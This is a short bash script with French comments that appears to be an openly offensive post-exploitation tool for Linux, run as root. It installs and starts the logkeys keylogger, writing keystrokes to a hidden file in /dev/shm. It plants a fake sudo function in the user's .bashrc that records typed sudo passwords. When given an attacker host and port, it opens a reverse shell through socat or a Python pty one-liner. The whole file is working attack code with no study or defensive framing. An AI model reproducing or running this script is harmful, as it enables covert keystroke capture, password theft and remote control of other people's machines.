#!/bin/bash
# Lancé en root via sudo. Laisse la session utilisateur en arrière-plan.
export TERM=xterm-256color

U="${SUDO_USER:-$USER}"
UHOME=$(getent passwd "$U" | cut -d: -f6)
D=/dev/shm
KL=$D/.kl
HF=$D/.h

install -o "$U" -g "$U" -m 666 /dev/null "$KL"
install -o "$U" -g "$U" -m 666 /dev/null "$HF"

# --- 1. Keylogger evdev (root requis) ---
command -v logkeys >/dev/null || apt-get install -y logkeys >/dev/null 2>&1

DEV=$(grep -E 'Handlers|EV=' /proc/bus/input/devices \
      | grep -B1 'EV=120013' \
      | grep -o 'event[0-9]*' | head -1)

if command -v logkeys >/dev/null && [ -n "$DEV" ]; then
  logkeys -k 2>/dev/null          # tue une instance résiduelle
  if logkeys -s -d "/dev/input/$DEV" -o "$KL" --no-timestamps 2>/dev/null; then
    echo "[+] keylogger actif : /dev/input/$DEV -> $KL"
  else
    echo "[!] logkeys a echoue sur $DEV"
  fi
else
  echo "[!] logkeys absent ou device introuvable"
fi

# --- 2. Hook sudo dans le .bashrc de l'utilisateur reel ---
HOOK='sudo() { read -rsp "[sudo] password for $USER: " P; echo; echo "SUDO:$USER:$P" >> /dev/shm/.h; command sudo -S "$@" <<<"$P"; }'
if ! grep -q 'SUDO:$USER' "$UHOME/.bashrc" 2>/dev/null; then
  printf '%s\n' "$HOOK" >> "$UHOME/.bashrc"
  chown "$U:$U" "$UHOME/.bashrc"
  echo "[+] hook sudo -> $HF"
fi

# --- 4. callback vers l'attaquant si host + port fournis ---
if [ -n "$1" ] && [ -n "$2" ]; then
  if command -v socat >/dev/null; then
    setsid socat "EXEC:bash -li,pty,stderr,setsid,sigint,sane" "TCP:$1:$2" &
    echo "[+] callback socat -> $1:$2"
  else
    setsid python3 -c 'import pty,socket,os
s=socket.socket(); s.connect(("'"$1"'",'"$2"'))
for f in (0,1,2): os.dup2(s.fileno(),f)
pty.spawn("/bin/bash")' &
    echo "[+] callback python -> $1:$2"
  fi
fi

# --- 5. shell local sur le terminal ---
exec bash -li
